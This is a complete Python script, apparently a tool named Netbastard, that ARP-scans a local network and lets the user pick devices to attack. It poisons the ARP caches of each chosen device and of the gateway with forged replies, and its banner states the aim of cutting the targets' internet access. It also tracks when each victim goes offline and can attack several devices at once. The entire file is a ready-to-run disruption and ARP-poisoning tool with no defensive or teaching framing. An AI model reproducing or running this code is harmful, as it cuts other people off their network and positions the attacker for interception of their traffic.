import sys
import os
import time
import threading
import socket
import ipaddress
import struct
from datetime import datetime

try:
    from scapy.all import ARP, Ether, srp, send, conf
    from scapy.arch import get_windows_if_list
except ImportError:
    print("[!] Scapy required. Install: pip install scapy")
    sys.exit(1)

try:
    import colorama
    colorama.init()
    R = colorama.Fore.RED
    G = colorama.Fore.GREEN
    Y = colorama.Fore.YELLOW
    C = colorama.Fore.CYAN
    M = colorama.Fore.MAGENTA
    W = colorama.Fore.WHITE
    B = colorama.Fore.BLUE
    RS = colorama.Style.RESET_ALL
    BR = colorama.Style.BRIGHT
except ImportError:
    R = G = Y = C = M = W = B = RS = BR = ""

conf.verb = 0

class Netbastard:
    def __init__(self):
        self.gateway_ip = None
        self.gateway_mac = None
        self.interface = None
        self.interface_ip = None
        self.devices = []
        self.targets = {}
        self.attack_threads = {}
        self.running = False
        self.lock = threading.Lock()

    def check_admin(self):
        try:
            if os.name == 'nt':
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False

    def get_network_info(self):
        if os.name == 'nt':
            return self._get_network_info_windows()
        else:
            return self._get_network_info_linux()

    def _get_network_info_windows(self):
        try:
            ifaces = get_windows_if_list()
            for iface in ifaces:
                if iface['ips'] and any(ip['type'] == 'ipv4' and not ip['addr'].startswith('127.') and not ip['addr'].startswith('169.') for ip in iface['ips']):
                    for ip_info in iface['ips']:
                        if ip_info['type'] == 'ipv4' and not ip_info['addr'].startswith('127.') and not ip_info['addr'].startswith('169.'):
                            self.interface = iface['name']
                            self.interface_ip = ip_info['addr']
                            for gw in iface.get('gateway', []):
                                try:
                                    socket.inet_aton(gw)
                                    self.gateway_ip = gw
                                    break
                                except:
                                    continue
                            break
                    if self.gateway_ip:
                        break

            if not self.gateway_ip:
                out = os.popen('ipconfig | findstr /i "gateway" 2>nul').read().strip()
                for line in out.split('\n'):
                    parts = line.split(':')
                    if len(parts) >= 2:
                        ip = parts[-1].strip()
                        try:
                            socket.inet_aton(ip)
                            self.gateway_ip = ip
                            break
                        except:
                            continue
            if not self.interface_ip:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                self.interface_ip = s.getsockname()[0]
                s.close()
            return self.gateway_ip is not None
        except Exception as e:
            print(f"{R}[!] Error getting network info: {e}{RS}")
            return False

    def _get_network_info_linux(self):
        try:
            out = os.popen("ip route | grep default").read().strip()
            if out:
                parts = out.split()
                self.gateway_ip = parts[2]
                iface_name = parts[4]
                self.interface = iface_name
                out2 = os.popen(f"ip -4 addr show {iface_name} | grep inet").read().strip()
                if out2:
                    self.interface_ip = out2.split()[1].split('/')[0]
            else:
                out = os.popen("route -n | grep 'UG[ ]'").read().strip()
                if out:
                    self.gateway_ip = out.split()[1]
            if not self.interface_ip:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                self.interface_ip = s.getsockname()[0]
                s.close()
            return self.gateway_ip is not None
        except:
            return False

    def resolve_gateway_mac(self):
        try:
            arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.gateway_ip)
            ans, _ = srp(arp, timeout=2, retry=2, verbose=False)
            for _, rcv in ans:
                self.gateway_mac = rcv[Ether].src
                return True
        except:
            pass
        return False

    def scan_network(self):
        self.devices = []
        ip = ipaddress.IPv4Address(self.interface_ip)
        network = ipaddress.IPv4Network(f"{ip}/24", strict=False)
        network_addr = str(network.network_address)
        prefix = '.'.join(network_addr.split('.')[:3])
        total = 254

        print(f"{C}[*] Scanning {network} ...{RS}")

        threads = []
        results = []

        def ping_scan(i):
            target = f"{prefix}.{i}"
            try:
                arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target)
                ans, _ = srp(arp, timeout=1, verbose=False)
                for _, rcv in ans:
                    results.append({
                        'ip': rcv[ARP].psrc,
                        'mac': rcv[Ether].src,
                        'hostname': ''
                    })
            except:
                pass

        batch_size = 50
        for i in range(1, total + 1):
            t = threading.Thread(target=ping_scan, args=(i,))
            threads.append(t)
            t.start()
            if len(threads) >= batch_size:
                for t in threads:
                    t.join()
                threads = []
        for t in threads:
            t.join()

        for d in results:
            try:
                host = socket.gethostbyaddr(d['ip'])
                d['hostname'] = host[0]
            except:
                pass
            self.devices.append(d)

        self.devices.sort(key=lambda x: [int(o) for o in x['ip'].split('.')])
        return results

    def get_mac(self, ip):
        try:
            arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans, _ = srp(arp, timeout=2, verbose=False)
            for _, rcv in ans:
                return rcv[Ether].src
        except:
            pass
        return None

    def spoof(self, target_ip, target_mac, gateway_ip, gateway_mac, stop_event):
        poison_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        poison_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

        sent = 0
        while not stop_event.is_set():
            send(poison_target, verbose=False)
            send(poison_gateway, verbose=False)
            sent += 2
            if sent % 20 == 0:
                with self.lock:
                    if target_ip in self.targets:
                        self.targets[target_ip]['packets_sent'] = sent
            time.sleep(1)

    def restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=4, verbose=False)
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)

    def check_connection(self, ip):
        try:
            arp = ARP(pdst=ip)
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp, timeout=1, verbose=False)
            return len(ans) > 0
        except:
            return False

    def monitor_target(self, target_ip, stop_event):
        was_online = True
        while not stop_event.is_set():
            online = self.check_connection(target_ip)
            with self.lock:
                if target_ip in self.targets:
                    self.targets[target_ip]['online'] = online
            if was_online and not online:
                with self.lock:
                    if target_ip in self.targets:
                        self.targets[target_ip]['disconnected_at'] = datetime.now()
                print(f"\n{G}[+] Target {target_ip} has been isolated!{RS}")
            was_online = online
            for _ in range(5):
                if stop_event.is_set():
                    break
                time.sleep(1)

    def start_attack(self, target_ip, target_mac=None):
        if target_ip in self.targets and self.targets[target_ip]['active']:
            print(f"{Y}[!] Attack already running on {target_ip}{RS}")
            return

        if not target_mac:
            mac = self.get_mac(target_ip)
            if not mac:
                print(f"{R}[!] Could not resolve MAC for {target_ip}{RS}")
                return
            target_mac = mac

        if target_ip not in self.targets:
            self.targets[target_ip] = {
                'mac': target_mac,
                'active': False,
                'online': True,
                'packets_sent': 0,
                'disconnected_at': None,
                'started_at': None
            }

        stop_event = threading.Event()
        self.targets[target_ip]['active'] = True
        self.targets[target_ip]['started_at'] = datetime.now()
        self.targets[target_ip]['disconnected_at'] = None
        self.targets[target_ip]['packets_sent'] = 0

        t = threading.Thread(target=self.spoof, args=(target_ip, target_mac, self.gateway_ip, self.gateway_mac, stop_event), daemon=True)
        self.attack_threads[target_ip] = {'thread': t, 'stop': stop_event}
        t.start()

        t2 = threading.Thread(target=self.monitor_target, args=(target_ip, stop_event), daemon=True)
        t2.start()

        print(f"{G}[+] Attack started on {target_ip} ({target_mac}){RS}")

    def stop_attack(self, target_ip):
        if target_ip not in self.attack_threads:
            print(f"{Y}[!] No active attack on {target_ip}{RS}")
            return

        self.attack_threads[target_ip]['stop'].set()
        self.attack_threads[target_ip]['thread'].join(timeout=3)

        mac = self.targets[target_ip]['mac']
        self.restore(target_ip, mac, self.gateway_ip, self.gateway_mac)
        self.targets[target_ip]['active'] = False

        del self.attack_threads[target_ip]
        print(f"{G}[+] Attack stopped on {target_ip}, ARP table restored{RS}")

    def stop_all(self):
        for ip in list(self.attack_threads.keys()):
            self.stop_attack(ip)

    def print_devices(self):
        if not self.devices:
            print(f"{Y}[!] No devices found. Scan the network first.{RS}")
            return

        print(f"\n{C}{'='*70}{RS}")
        print(f"{BR}{C}   #  IP Address       MAC Address        Hostname                      Status{RS}")
        print(f"{C}{'='*70}{RS}")
        for i, d in enumerate(self.devices, 1):
            ip = d['ip']
            mac = d['mac']
            hostname = d['hostname'][:28] if d['hostname'] else '(unknown)'
            status = f"{G}Online{RS}" if d.get('online', True) else f"{R}Offline{RS}"
            if ip in self.targets and self.targets[ip]['active']:
                status = f"{R}*ATTACK*{RS}"
            print(f"  {i:2d}   {ip:<15} {mac:<17} {hostname:<28} {status}")
        print(f"{C}{'='*70}{RS}")
        print(f"{C}  Total: {len(self.devices)} devices found{RS}\n")

    def print_status(self):
        print(f"\n{BR}{C}=== Attack Status ==={RS}")
        if not self.targets:
            print(f"{Y}  No targets configured{RS}")
        else:
            for ip, info in self.targets.items():
                if info['active']:
                    status = f"{R}OFFLINE{RS}" if not info['online'] else f"{G}ONLINE{RS}"
                    elapsed = datetime.now() - info['started_at']
                    m, s = divmod(int(elapsed.total_seconds()), 60)
                    dis = info['disconnected_at'].strftime('%H:%M:%S') if info['disconnected_at'] else '-'
                    print(f"  {M}{ip}{RS} | MAC: {info['mac']} | Status: {status} | Packets: {info['packets_sent']} | Elapsed: {m:02d}:{s:02d} | Offline at: {dis}")
        print()

    def interactive(self):
        banner = [
r"  _   _      _          _               _           _",
r" | \ | | ___| |__  __ _| |_  __ _ ___  | |__   __ _| |_ __ _",
r" |  \| |/ _ | '_ \/ _` | __|/ _` / __| | '_ \ / _` | __/ _` |",
r" | |\  |  __| |_) | (_| | |_| (_| \__ \ | | | | (_| | |_| (_| |",
r" |_| \_|\___|_.__/ \__,_|\__|\__,_|___/ |_| |_|\__,_|\__\__,_|",
        ]
        print(f"\n{BR}{R}" + "\n".join(banner) + f"{RS}")
        print(f"{BR}{C}  Network Isolation Tool - ARP Spoofing{RS}")
        print(f"{BR}{Y}  Target a device and cut their internet access{RS}")
        print(f"{BR}{M}  https://github.com/anomalyco/netbastard{RS}")
        print()

        if not self.check_admin():
            print(f"{R}[!] Administrator/root privileges required for ARP spoofing!{RS}")
            print(f"{Y}[!] Please run as Administrator (Windows) or root (Linux){RS}\n")
            if os.name == 'nt':
                print(f"{Y}[!] Right-click -> Run as Administrator{RS}")
            else:
                print(f"{Y}[!] Use: sudo python netbastard.py{RS}")
            if input(f"{Y}[?] Continue anyway? (y/N): {RS}").lower() != 'y':
                return

        print(f"{C}[*] Detecting network configuration...{RS}")
        if not self.get_network_info():
            print(f"{R}[!] Could not determine gateway. Enter manually:{RS}")
            self.gateway_ip = input("Gateway IP: ").strip()
            self.interface_ip = input("Your IP: ").strip()
            if not self.gateway_ip:
                print(f"{R}[!] Gateway IP required.{RS}")
                return

        print(f"{G}[+] Gateway: {self.gateway_ip}{RS}")
        print(f"{G}[+] Your IP: {self.interface_ip}{RS}")

        print(f"{C}[*] Resolving gateway MAC...{RS}")
        if not self.resolve_gateway_mac():
            print(f"{R}[!] Could not resolve gateway MAC. Enter manually:{RS}")
            self.gateway_mac = input("Gateway MAC: ").strip()
            if not self.gateway_mac:
                print(f"{R}[!] Gateway MAC required.{RS}")
                return
        print(f"{G}[+] Gateway MAC: {self.gateway_mac}{RS}")

        while True:
            self.print_menu()
            choice = input(f"{BR}{C}netbastard>{RS} ").strip().lower()

            if choice == '1' or choice == 'scan':
                self.scan_network()
                self.print_devices()

            elif choice == '2' or choice == 'list':
                self.print_devices()

            elif choice == '3' or choice == 'attack':
                if not self.devices:
                    print(f"{Y}[!] No devices. Scan network first (option 1).{RS}")
                    continue
                self.print_devices()
                try:
                    idx = int(input(f"{C}Enter device # to attack: {RS}"))
                    if 1 <= idx <= len(self.devices):
                        target = self.devices[idx - 1]
                        self.start_attack(target['ip'], target['mac'])
                    else:
                        print(f"{R}[!] Invalid number{RS}")
                except ValueError:
                    print(f"{R}[!] Enter a valid number{RS}")

            elif choice == '4' or choice == 'stop':
                if not self.targets:
                    print(f"{Y}[!] No active attacks{RS}")
                    continue
                active = [ip for ip, info in self.targets.items() if info['active']]
                if not active:
                    print(f"{Y}[!] No active attacks{RS}")
                    continue
                for i, ip in enumerate(active, 1):
                    print(f"  {i}. {ip}")
                try:
                    idx = int(input(f"{C}Enter # to stop (0 = all): {RS}"))
                    if idx == 0:
                        self.stop_all()
                    elif 1 <= idx <= len(active):
                        self.stop_attack(active[idx - 1])
                except ValueError:
                    print(f"{R}[!] Enter a valid number{RS}")

            elif choice == '5' or choice == 'status':
                self.print_status()

            elif choice == '6' or choice == 'multi':
                if not self.devices:
                    print(f"{Y}[!] No devices. Scan network first (option 1).{RS}")
                    continue
                self.print_devices()
                print(f"{C}Enter device numbers separated by commas (e.g. 1,3,5):{RS}")
                try:
                    inp = input(f"{BR}{C}multi>{RS} ").strip()
                    indices = [int(x.strip()) for x in inp.split(',') if x.strip()]
                    for idx in indices:
                        if 1 <= idx <= len(self.devices):
                            target = self.devices[idx - 1]
                            self.start_attack(target['ip'], target['mac'])
                        else:
                            print(f"{R}[!] Invalid number: {idx}{RS}")
                except ValueError:
                    print(f"{R}[!] Invalid input{RS}")

            elif choice == '7' or choice == 'stopall':
                self.stop_all()
                print(f"{G}[+] All attacks stopped{RS}")

            elif choice == '8' or choice in ('q', 'quit', 'exit'):
                print(f"{Y}[*] Restoring ARP tables...{RS}")
                self.stop_all()
                print(f"{G}[+] Done. Goodbye.{RS}")
                break

            else:
                print(f"{Y}[!] Unknown option{RS}")

    def print_menu(self):
        print(f"""
{BR}{C}┌─────────────────────────────────────┐
│ Netbastard - Menu                  │
├─────────────────────────────────────┤
│ {W}1{RS}.{C} Scan Network{RS}                         │
│ {W}2{RS}.{C} List Devices{RS}                        │
│ {W}3{RS}.{C} Attack Target{RS}                       │
│ {W}4{RS}.{C} Stop Attack{RS}                         │
│ {W}5{RS}.{C} Show Status{RS}                         │
│ {W}6{RS}.{C} Multi Attack{RS}                        │
│ {W}7{RS}.{C} Stop All{RS}                            │
│ {W}8{RS}.{C} Quit{RS}                                │
└─────────────────────────────────────┘{RS}
        """)


def main():
    try:
        app = Netbastard()
        app.interactive()
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Interrupted. Exiting...{RS}")
        if 'app' in dir():
            app.stop_all()
    except Exception as e:
        print(f"{R}[!] Fatal error: {e}{RS}")
        sys.exit(1)


if __name__ == '__main__':
    main()
